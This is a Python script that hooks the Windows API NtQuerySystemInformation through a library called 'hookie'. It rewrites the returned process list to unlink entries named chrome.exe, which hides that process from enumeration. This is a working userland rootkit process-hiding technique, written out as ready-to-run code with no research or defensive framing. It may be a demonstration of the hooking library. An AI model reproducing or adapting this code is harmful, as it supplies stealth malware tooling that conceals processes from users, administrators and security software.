import ctypes
from ctypes import wintypes
import hookie

STATUS_SUCCESS = 0x00000000
SystemProcessInformation = 5

ntdll = ctypes.windll.ntdll

ntdll.NtQuerySystemInformation.argtypes = [
    wintypes.ULONG,
    ctypes.c_void_p,
    wintypes.ULONG,
    ctypes.POINTER(wintypes.ULONG),
]
ntdll.NtQuerySystemInformation.restype = ctypes.c_long


def nt_query_system_information_hook(system_information_class, system_information, system_information_length, return_length):
    status = hook.original(system_information_class, system_information, system_information_length, return_length)

    # SystemProcessInformation (0x05) sorgusu başarılıysa
    if status == STATUS_SUCCESS and system_information_class == SystemProcessInformation:
        if system_information:
            current_address = ctypes.cast(system_information, ctypes.c_void_p).value
            prev_address = None

            while True:
                next_offset = ctypes.cast(
                    current_address, ctypes.POINTER(wintypes.ULONG)
                ).contents.value

                name_length = ctypes.cast(
                    current_address + 0x38, ctypes.POINTER(wintypes.USHORT)
                ).contents.value
                buffer_ptr = ctypes.cast(
                    current_address + 0x40, ctypes.POINTER(ctypes.c_void_p)
                ).contents.value

                process_name = ''
                if buffer_ptr and name_length > 0:
                    process_name = ctypes.wstring_at(buffer_ptr, name_length // 2)

                target_process_to_hide = 'chrome.exe'

                if process_name.lower() == target_process_to_hide.lower():
                    if prev_address:
                        prev_next_offset_ptr = ctypes.cast(
                            prev_address, ctypes.POINTER(wintypes.ULONG)
                        )
                        if next_offset == 0:
                            prev_next_offset_ptr.contents.value = 0
                        else:
                            prev_next_offset_ptr.contents.value += next_offset
                else:
                    prev_address = current_address

                if next_offset == 0:
                    break

                current_address += next_offset

    return status

target_addr = ctypes.cast( ntdll.NtQuerySystemInformation, ctypes.c_void_p).value
engine = hookie.HookEngine()

hook = engine.create_hook(
    target_addr,
    nt_query_system_information_hook,
    ntdll.NtQuerySystemInformation.argtypes,
    ntdll.NtQuerySystemInformation.restype,
)
hook.enable()